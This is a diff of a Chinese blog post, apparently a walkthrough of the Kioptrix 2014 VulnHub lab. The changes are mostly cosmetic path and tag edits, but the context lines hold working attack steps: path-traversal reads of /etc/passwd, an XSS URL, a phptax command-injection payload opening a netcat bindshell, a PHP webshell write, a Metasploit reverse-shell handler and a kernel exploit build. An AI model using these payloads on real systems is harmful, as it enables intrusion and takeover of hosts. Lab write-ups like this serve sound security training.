@@ -17,22 +17,22 @@
 <meta property="og:site_name" content="zhou">
 <meta property="og:description" content="kioptrix系列最后一个靶机了 环境镜像下载地址：kioptrix 2014">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/1.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/2.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/3.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/4.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/5.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/6.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/7.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/8.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/9.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/10.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/6.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/7.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/8.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/9.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/10.png">
 <meta property="article:published_time" content="2024-09-08T11:45:39.000Z">
-<meta property="article:modified_time" content="2024-09-08T14:52:15.354Z">
+<meta property="article:modified_time" content="2024-09-09T06:43:22.571Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="VulnHub靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.zyp0422.mom/kioptrix-2014/1.png">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/kioptrix-2014/kioptrix-2014/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -402,8 +402,8 @@
 <span id="more"></span>
 
 <p>靶机目标：获得靶机root权限</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载完，打开是无法直接查到IP的，提示我们需要重设置一下网卡</p>
-<p><img src="/kioptrix-2014/1.png"></p>
+<h3 id="F环境搭建"><a href="#F环境搭建" class="headerlink" title="F环境搭建"></a>F环境搭建</h3><p>下载完，打开是无法直接查到IP的，提示我们需要重设置一下网卡</p>
+<p><img src="/kioptrix-2014/kioptrix-2014/1.png"></p>
 <p>将网络适配器删除，然后重新添加一个网络适配器，最后开机就可以了</p>
 <h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">arp-scan</span> <span class="selector-tag">-l</span></span><br></pre></td></tr></table></figure>
 
@@ -428,18 +428,18 @@
 <p>从文档可以看出来存在任意文件读取漏洞</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.159/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-2014/2.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/2.png"></p>
 <h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.159/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E</span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-2014/3.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/3.png"></p>
 <p>做到这就没思路了，于是上网看了一下别人的解题思路</p>
 <p>说是FreeBSD: release&#x2F;9.0.0这个版本知道apache位置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In FreeBSD, the main Apache HTTP Server configuration file is installed as /usr/local/etc/apache2 x /httpd.conf , where x represents the version number. This ASCII text file begins comment lines with a # . The most frequently modified directives are: ServerRoot &quot;/usr/local&quot;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.159/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-2014/4.png"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="/kioptrix-2014/5.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/4.png"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="/kioptrix-2014/kioptrix-2014/5.png"></p>
 <p>正常访问8080端口是无法打开的，需要修改User-Agent</p>
 <p>访问提示的目录没有什么可以利用的</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">searchsploit</span> <span class="selector-tag">phptax</span></span><br></pre></td></tr></table></figure>
@@ -451,8 +451,8 @@
 <p>最后在21665.txt中发现吗，命令执行漏洞</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">┌──(<span class="selector-tag">root</span>💀<span class="selector-class">.kali</span>)<span class="selector-tag">-</span><span class="selector-attr">[~]</span></span><br><span class="line">└─# <span class="selector-tag">cat</span> <span class="number">21665</span><span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-tag">-----------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">phptax</span> <span class="number">0.8</span> &lt;= <span class="selector-tag">Remote</span> <span class="selector-tag">Code</span> <span class="selector-tag">Execution</span> <span class="selector-tag">Vulnerability</span></span><br><span class="line"><span class="selector-tag">-----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Discovered</span> <span class="selector-tag">by</span>: <span class="selector-tag">Jean</span> <span class="selector-tag">Pascal</span> <span class="selector-tag">Pereira</span> &lt;<span class="selector-tag">pereira</span>@<span class="selector-tag">secbiz</span><span class="selector-class">.de</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Vendor</span> <span class="selector-tag">information</span>:</span><br><span class="line"></span><br><span class="line">&quot;<span class="selector-tag">PhpTax</span> <span class="selector-tag">is</span> <span class="selector-tag">free</span> <span class="selector-tag">software</span> <span class="selector-tag">to</span> <span class="selector-tag">do</span> <span class="selector-tag">your</span> <span class="selector-tag">U</span><span class="selector-class">.S</span>. <span class="selector-tag">income</span> <span class="selector-tag">taxes</span>. <span class="selector-tag">Tested</span> <span class="selector-tag">under</span> <span class="selector-tag">Unix</span> <span class="selector-tag">environment</span>.</span><br><span class="line"><span class="selector-tag">The</span> <span class="selector-tag">program</span> <span class="selector-tag">generates</span> <span class="selector-class">.pdfs</span> <span class="selector-tag">that</span> <span class="selector-tag">can</span> <span class="selector-tag">be</span> <span class="selector-tag">printed</span> <span class="selector-tag">and</span> <span class="selector-tag">sent</span> <span class="selector-tag">to</span> <span class="selector-tag">the</span> <span class="selector-tag">IRS</span>. <span class="selector-tag">See</span> <span class="selector-tag">homepage</span> <span class="selector-tag">for</span> <span class="selector-tag">details</span> <span class="selector-tag">and</span> <span class="selector-tag">screenshot</span>.&quot;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Vendor</span> <span class="selector-tag">URI</span>: <span class="selector-tag">http</span>:<span class="comment">//sourceforge.net/projects/phptax/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Risk-level</span>: <span class="selector-tag">High</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">The</span> <span class="selector-tag">application</span> <span class="selector-tag">is</span> <span class="selector-tag">prone</span> <span class="selector-tag">to</span> <span class="selector-tag">a</span> <span class="selector-tag">remote</span> <span class="selector-tag">code</span> <span class="selector-tag">execution</span> <span class="selector-tag">vulnerability</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">drawimage</span><span class="selector-class">.php</span>, <span class="selector-tag">line</span> <span class="number">63</span>:</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">include</span> (<span class="string">&quot;./files/$_GET[pfilez]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// makes a png image</span></span><br><span class="line">$<span class="selector-tag">pfilef</span>=<span class="selector-tag">str_replace</span>(<span class="string">&quot;.tob&quot;</span>,<span class="string">&quot;.png&quot;</span>,$_GET[pfilez]);</span><br><span class="line">$<span class="selector-tag">pfilep</span>=<span class="selector-tag">str_replace</span>(<span class="string">&quot;.tob&quot;</span>,<span class="string">&quot;.pdf&quot;</span>,$_GET[pfilez]);</span><br><span class="line"><span class="selector-tag">Header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line"><span class="selector-tag">if</span> ($_GET[pdf] == <span class="string">&quot;&quot;</span>) <span class="selector-tag">Imagepng</span>($image);</span><br><span class="line"><span class="selector-tag">if</span> ($_GET[pdf] == <span class="string">&quot;make&quot;</span>) <span class="selector-tag">Imagepng</span>($image,<span class="string">&quot;./data/pdf/$pfilef&quot;</span>);</span><br><span class="line"><span class="selector-tag">if</span> ($_GET[pdf] == <span class="string">&quot;make&quot;</span>) <span class="selector-tag">exec</span>(<span class="string">&quot;convert ./data/pdf/$pfilef ./data/pdf/$pfilep&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Exploit</span> / <span class="selector-tag">Proof</span> <span class="selector-tag">of</span> <span class="selector-tag">Concept</span>:</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Bindshell</span> <span class="selector-tag">on</span> <span class="selector-tag">port</span> <span class="number">23235</span> <span class="selector-tag">using</span> <span class="selector-tag">netcat</span>:</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">http</span>:<span class="comment">//localhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&amp;pdf=make</span></span><br><span class="line"></span><br><span class="line">** <span class="selector-tag">Exploit-DB</span> <span class="selector-tag">Verified</span>:**</span><br><span class="line"><span class="selector-tag">http</span>:<span class="comment">//localhost/phptax/index.php?pfilez=1040d1-pg2.tob;nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&amp;pdf=make</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Solution</span>:</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Do</span> <span class="selector-tag">some</span> <span class="selector-tag">input</span> <span class="selector-tag">validation</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">----------------------------------------------------</span>    </span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-2014/6.png"></p>
-<p><img src="/kioptrix-2014/7.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/6.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/7.png"></p>
 <h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>本来想直接反弹shell的，但是没有成功，于是先写入一句话木马</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.159:8080/phptax/drawimage.php?pfilez=xxx;<span class="selector-tag">echo</span> &quot;&lt;?<span class="selector-tag">php</span> <span class="selector-tag">system</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;&quot; &gt; <span class="selector-tag">shell</span><span class="selector-class">.php</span>;<span class="selector-tag">&amp;</span><span class="selector-tag">pdf</span>=<span class="selector-tag">make</span></span><br></pre></td></tr></table></figure>
 
@@ -470,8 +470,8 @@
 <h5 id="MSF启动监听"><a href="#MSF启动监听" class="headerlink" title="MSF启动监听"></a>MSF启动监听</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 启动MSF</span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"># 使用exploit/multi/handler</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"># 设置基本options</span><br><span class="line">set lhost kaliIP</span><br><span class="line">set lport 4444(不设置也没关系，MSF中使用的模块默认端口都是4444)</span><br><span class="line"></span><br><span class="line"># 对于windows的payload设置</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"># 对于Linux的payload设置</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"># 启动监听</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <h5 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h5><p>目标机器利用一句话木马执行我们上传的php文件</p>
-<p><img src="/kioptrix-2014/8.png"></p>
-<p><img src="/kioptrix-2014/9.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/8.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/9.png"></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">uname</span> <span class="selector-tag">-a</span></span><br><span class="line"><span class="selector-tag">FreeBSD</span> <span class="selector-tag">kioptrix2014</span> <span class="number">9.0</span><span class="selector-tag">-RELEASE</span> <span class="selector-tag">FreeBSD</span> <span class="number">9.0</span><span class="selector-tag">-RELEASE</span> <span class="selector-id">#0</span>: <span class="selector-tag">Tue</span> <span class="selector-tag">Jan</span>  <span class="number">3</span> <span class="number">07</span>:<span class="number">46</span>:<span class="number">30</span> <span class="selector-tag">UTC</span> <span class="number">2012</span>     <span class="selector-tag">root</span>@<span class="selector-tag">farrell</span><span class="selector-class">.cse</span><span class="selector-class">.buffalo</span><span class="selector-class">.edu</span>:/<span class="selector-tag">usr</span>/<span class="selector-tag">obj</span>/<span class="selector-tag">usr</span>/<span class="selector-tag">src</span>/<span class="selector-tag">sys</span>/<span class="selector-tag">GENERIC</span>  <span class="selector-tag">amd64</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">searchsploit</span> <span class="selector-tag">FreeBSD</span> <span class="number">9.0</span></span><br></pre></td></tr></table></figure>
@@ -484,7 +484,7 @@
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">gcc</span> <span class="number">26368</span><span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">./<span class="selector-tag">a</span><span class="selector-class">.out</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-2014/10.png"></p>
+<p><img src="/kioptrix-2014/kioptrix-2014/10.png"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
 <li>任意文件读取、任意命令执行、xss漏洞</li>
 <li>MSF反弹shell</li>
@@ -632,6 +632,15 @@
 
 <nav id="article-nav">
   
+    <a href="/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-%E6%81%A2%E5%A4%8D%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          git源码泄露-恢复删除数据
+        
+      </div>
+    </a>
+  
   
     <a href="/kioptrix-level1-3/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">kioptrix-level1-3</div>
@@ -661,7 +670,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">4.</span> <span class="toc-text">whatweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">xss漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">7.1.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90shell"><span class="toc-number">7.1.1.</span> <span class="toc-text">生成shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0shell"><span class="toc-number">7.1.2.</span> <span class="toc-text">上传shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF%E5%90%AF%E5%8A%A8%E7%9B%91%E5%90%AC"><span class="toc-number">7.1.3.</span> <span class="toc-text">MSF启动监听</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="toc-number">7.1.4.</span> <span class="toc-text">获得shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">8.1.</span> <span class="toc-text">内核提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">9.</span> <span class="toc-text">总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">F环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">4.</span> <span class="toc-text">whatweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">xss漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">7.1.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90shell"><span class="toc-number">7.1.1.</span> <span class="toc-text">生成shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0shell"><span class="toc-number">7.1.2.</span> <span class="toc-text">上传shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF%E5%90%AF%E5%8A%A8%E7%9B%91%E5%90%AC"><span class="toc-number">7.1.3.</span> <span class="toc-text">MSF启动监听</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="toc-number">7.1.4.</span> <span class="toc-text">获得shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">8.1.</span> <span class="toc-text">内核提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">9.</span> <span class="toc-text">总结</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -830,15 +839,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -854,7 +863,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
              
               <li class="article-tag-list-item">
